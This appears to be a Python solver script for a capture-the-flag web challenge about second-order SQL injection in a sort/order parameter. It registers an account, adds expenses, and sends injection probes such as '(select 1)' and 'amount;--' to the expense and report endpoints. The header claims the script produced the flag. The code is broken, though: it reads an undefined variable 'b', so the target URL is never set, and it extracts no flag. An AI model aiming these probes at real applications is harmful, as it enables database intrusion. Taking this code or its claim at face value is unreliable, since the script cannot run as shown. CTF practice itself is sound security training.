# 752 - ORDER ORDER  (Web Exploitation, picoCTF 2026)
# Flag: academy{s3c0nd_0rd3r_1t_1s_b7405f26}
# Write-up: ../../../writeups/web-exploitation/752-order-order.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, re, json, time, requests, urllib3

# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
# l'hote et le port (ou l'URL) en argument de ce script.
_A = sys.argv[1:]
HOST = _A[0] if len(_A) > 0 else ""
PORT = int(_A[1]) if len(_A) > 1 else 0
url = _A[0] if _A else ""

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()

base = None
for _ in range(12):
    time.sleep(0.9)
    d = json.loads(b) if b.startswith("{") else {}
    m = re.search(r"(https?://[A-Za-z0-9.\-]+:\d+)", d.get("description") or "")
    if m:
        base = m.group(1).rstrip("/") + "/"
        break
print("base:", base)
s = requests.Session()
u = "p%d" % (int(time.time() * 7) % 100000)
s.post(base + "signup", data={"username": u, "email": u + "@x.io", "password": "pw"}, timeout=30)
time.sleep(0.8)
s.post(base + "login", data={"username": u, "password": "pw"}, timeout=30)
time.sleep(0.8)
for i in range(2):
    s.post(base + "expenses", data={"description": "e%d" % i, "amount": str(5 + i), "date": "2024-04-0%d" % (i+1)}, timeout=30)
    time.sleep(1.0)

def show(label, r):
    m = re.search(r"(error|Error|SQL|sqlite|Traceback|syntax|no such)", r.text)
    print("%-46s -> %d (%d) %s" % (label, r.status_code, len(r.text), ("ERR:" + m.group(0)) if m else ""))

probes = ["sort=description", "sort=xxx", "order=desc", "sort=1", "sort=(select 1)",
          "order=description desc", "sort=description&order=asc", "sort=amount;--"]
for q in probes:
    try:
        show("GET /expenses?" + q, s.get(base + "expenses?" + q, timeout=25))
    except Exception as e:
        print("%-46s -> ERR %s" % (q, type(e).__name__))
    time.sleep(0.9)

for body in ({"sort": "description"}, {"order": "desc"}, {"sort": "xxx"},
             {"sort": "(select 1)"}, {}):
    try:
        show("POST /generate_report %s" % body, s.post(base + "generate_report", data=body, timeout=25))
    except Exception as e:
        print("POST %s -> ERR %s" % (body, type(e).__name__))
    time.sleep(0.9)

r = s.get(base + "inbox", timeout=25)
print("inbox:", r.status_code, len(r.text))
print(re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text))[:400])
